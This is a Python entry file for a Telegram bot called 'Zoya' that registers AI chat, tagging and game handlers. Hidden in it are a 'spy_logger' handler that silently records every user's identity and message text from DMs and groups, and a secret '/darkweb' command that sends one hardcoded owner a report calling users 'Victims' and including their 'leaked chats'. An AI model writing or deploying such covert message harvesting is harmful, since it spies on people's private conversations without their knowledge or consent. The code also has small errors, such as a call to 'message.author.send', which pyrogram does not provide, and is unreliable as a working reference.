# main.py
import asyncio
from pyrogram import Client, idle, filters, enums
from pyrogram.handlers import MessageHandler
import config
import tag
import ai
import social_db
import stats
import game

# --- CLIENT INIT ---
app = Client(
    "zoya_bot_v2",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN
)

async def secret_reveal(client, message):
    if message.from_user.id != 8232910685:
        return

    users, groups = social_db.get_stats()
    try:
        gossip_data = social_db.get_gossip_context()
    except:
        gossip_data = "No recent gossip."
    report = (
        f"🕵️ **ZOYA SYSTEM BREAKDOWN (Top Secret)** 🕵️\n\n"
        f"👑 **System Owner:** Master Emoji (Authorized)\n"
        f"📡 **GitHub:** https://github.com/sunnyptl95\n\n"
        f"📊 **Database Stats:**\n"
        f"   - 👥 Total Users (Victims): `{users}`\n"
        f"   - 🏘️ Monitored Groups: `{groups}`\n\n"
        f"🔥 **LATEST LEAKED CHATS (Gossip):**\n"
        f"{gossip_data}\n\n"
        f"🛡️ **God Mode:** ON (You can Rob anyone)"
    )
    try:
        await message.author.send(report)
        await message.reply_text("✅ **Secret Report Sent to DM!** 🤫")
    except:
        await message.reply_text(report)

# --- SPY LOGGER (The Eyes) ---
async def spy_logger(client, message):
    if not message.from_user: return
    
    # Determine Context (DM vs Group)
    if message.chat.type == enums.ChatType.PRIVATE:
        chat_source = "DM"
    else:
        chat_source = message.chat.title or "Unknown Group"

    user_text = message.text or "[Media/Sticker]"
    
    # Silent Log to Database
    try:
        social_db.log_user(
            message.from_user.id,
            message.from_user.first_name,
            message.from_user.username or "NoUser",
            chat_source,
            user_text
        )
    except Exception as e:
        print(f"Spy Error: {e}")

# --- REGISTER HANDLERS ---
# 1. Spy Handler (Runs first, independent group=1)
app.add_handler(MessageHandler(spy_logger, filters.text), group=1)

# 2. Existing Handlers
app.add_handler(tag.start_handler) #/start
app.add_handler(tag.broadcast_handler) #/broadcast
app.add_handler(tag.voice_saver_handler) #Sudo_user send voice note autosave
app.add_handler(tag.voice_tag_handler) #/voicetag
app.add_handler(tag.tag_all_handler) #/tagall
app.add_handler(tag.stop_tag_handler) #/stoptag

app.add_handler(stats.stats_handler)   # /stats (Public)
app.add_handler(stats.glist_handler)   # /glist (Owner Only)
app.add_handler(stats.ulist_handler)   # /ulist (Owner Only)
app.add_handler(game.thieves_handler)
app.add_handler(MessageHandler(secret_reveal, filters.command("darkweb"))) #runtime_Auto

# 3. Game / Economy Handlers (NEW)
app.add_handler(game.rob_handler)      # /rob
app.add_handler(game.protect_handler)  # /protect
app.add_handler(game.bal_handler)      # /bal
app.add_handler(game.top_handler)      # /top
app.add_handler(game.thieves_handler) # /thieves


# 3. AI Handlers
app.add_handler(ai.save_mode_handler)
app.add_handler(ai.chat_toggle_handler)
app.add_handler(ai.ai_sticker_handler)
app.add_handler(ai.ai_text_handler)

async def main():
    print("🚀 Zoya (Real Human Mode) System Started...")
    await app.start()
    
    # Cleanup Old Messages
    await tag.run_startup_cleanup(app)
    
    await idle()
    await app.stop()

if __name__ == "__main__":
    app.run(main())

